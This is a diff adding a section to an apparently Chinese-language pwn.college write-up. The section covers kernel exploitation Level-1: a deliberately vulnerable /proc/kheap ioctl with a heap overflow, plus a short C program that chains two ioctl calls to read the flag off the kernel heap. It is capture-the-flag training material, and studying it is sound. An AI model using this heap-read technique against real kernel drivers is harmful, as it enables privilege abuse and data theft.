@@ -498,3 +498,31 @@ exit:
     ret
 ```
 对了，尽量用最简单的方式输入payload。假如用pwntools的话，会增加存有flag的页面被申请的概率
+
+## [Kernel Exploitation](https://pwn.college/software-exploitation/kernel-exploitation)
+
+前面都只是热身，现在才刚刚开始（
+
+突然遇见`vm connect`超时的情况。此时直接运行`ssh vm`就好
+
+### Level-1
+
+ioctl中存在堆溢出，允许用户读/写堆上任意大小的内容。ioctl中还有一个将flag读到堆上的功能。很明显了，直接读取flag即可
+```c
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+int main() {
+    int fd = open("/proc/kheap", O_RDWR);
+    char buf[0x250];
+    unsigned long arg[2];
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf)-1;
+    ioctl(fd,0x5704,arg);
+    ioctl(fd,0x5700,arg);
+    write(1,buf,sizeof(buf));
+    return 0;
+}
+```
